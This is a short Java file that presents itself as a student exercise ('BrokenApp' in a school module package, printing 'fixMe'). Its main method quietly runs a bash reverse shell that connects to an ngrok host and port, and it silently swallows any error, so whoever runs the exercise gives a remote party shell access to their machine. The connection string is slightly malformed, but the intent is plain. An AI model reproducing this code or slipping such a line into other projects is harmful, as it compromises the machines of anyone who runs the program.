package school.mjc.stage0.module3.task1;

public class BrokenApp {
    public static void main(String[] args) {
        System.out.println("fixMe");
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp7.tcp.eu.ngrok.io/11724 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
